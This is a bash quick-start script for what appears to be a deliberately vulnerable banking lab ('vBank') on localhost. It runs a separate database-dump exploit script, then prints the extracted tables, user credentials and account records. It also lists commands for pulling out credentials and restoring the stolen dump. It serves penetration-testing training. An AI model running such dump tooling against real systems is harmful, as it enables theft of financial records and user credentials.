#!/bin/bash
# vBank Database Dump - Quick Start Script
# Demonstrates the complete database dump exploit in under 1 minute

set -e

echo "╔════════════════════════════════════════════════════════╗"
echo "║  vBank Database Dump Exploit - Quick Start             ║"
echo "║  Complete database extraction in < 30 seconds          ║"
echo "╚════════════════════════════════════════════════════════╝"

# Check if setup.sh has been run
if ! docker-compose ps 2>/dev/null | grep -q vbank_app; then
    echo ""
    echo "⚠️  Docker containers not running!"
    echo ""
    echo "Run setup first:"
    echo "  ./setup.sh"
    echo ""
    exit 1
fi

echo ""
echo "🎯 Demonstrating database dump exploit..."
echo ""

# Create output directory
OUTPUT_DIR="exploit_dumps"
mkdir -p "$OUTPUT_DIR"

# Method 1: Fastest - Bash script
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Method 1: Automated Bash Script (Recommended)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Command: ./db_dump.sh http://localhost $OUTPUT_DIR"
echo ""

if [ -f "db_dump.sh" ]; then
    ./db_dump.sh http://localhost "$OUTPUT_DIR"
    
    if [ -f "$OUTPUT_DIR/vbank_dump_"*.sql ]; then
        DUMP_FILE=$(ls -1 "$OUTPUT_DIR/vbank_dump_"*.sql | head -1)
        DUMP_SIZE=$(du -h "$DUMP_FILE" | cut -f1)
        echo ""
        echo "✅ Success! Database dumped:"
        echo "   File: $DUMP_FILE"
        echo "   Size: $DUMP_SIZE"
        echo ""
    fi
else
    echo "❌ db_dump.sh not found"
    exit 1
fi

# Show preview
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Database Content Preview"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if [ -f "$DUMP_FILE" ]; then
    echo "📊 Tables created:"
    grep "CREATE TABLE" "$DUMP_FILE" | sed 's/CREATE TABLE `/  ✓ /' | sed 's/` .*//'
    
    echo ""
    echo "📝 Records inserted:"
    echo "  Total: $(grep 'INSERT INTO' "$DUMP_FILE" | wc -l) records"
    
    echo ""
    echo "👤 Users extracted:"
    grep "INSERT INTO users" "$DUMP_FILE" | head -1 | sed "s/.*VALUES /  /" | sed 's/);.*//' || echo "  (Check file for details)"
    
    echo ""
    echo "💰 Accounts extracted:"
    grep "INSERT INTO accounts" "$DUMP_FILE" | head -1 | sed "s/.*VALUES /  /" | sed 's/);.*//' || echo "  (Check file for details)"
fi

# Show usage examples
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Other Methods Available"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "Method 2: Python (multiple output formats)"
echo "  python3 db_dump_exploit.py --method 1 --format sql"
echo "  python3 db_dump_exploit.py --method 3 --format json"
echo ""

echo "Method 3: Manual curl (educational)"
echo "  See DATABASE_DUMP_GUIDE.md for step-by-step instructions"
echo ""

# Verification commands
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Verification Commands"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if [ -f "$DUMP_FILE" ]; then
    echo "View dump file:"
    echo "  head -30 $DUMP_FILE"
    echo ""
    
    echo "Count extracted records:"
    echo "  grep 'INSERT INTO' $DUMP_FILE | wc -l"
    echo ""
    
    echo "Extract user credentials:"
    echo "  grep 'INSERT INTO users' $DUMP_FILE"
    echo ""
    
    echo "Restore to another database:"
    echo "  mysql -u root -ppassword < $DUMP_FILE"
    echo ""
fi

# Summary
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Database Dump Exploit Complete!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📖 Documentation:"
echo "  - DATABASE_DUMP_GUIDE.md (comprehensive)"
echo "  - DATABASE_DUMP_SUMMARY.md (overview)"
echo "  - PENETRATION_TESTING_GUIDE.md (integrated)"
echo "  - CHEATSHEET.md (quick reference)"
echo ""
echo "🔍 Security Impact: CRITICAL 🔴"
echo "  Complete database compromised in < 30 seconds"
echo ""
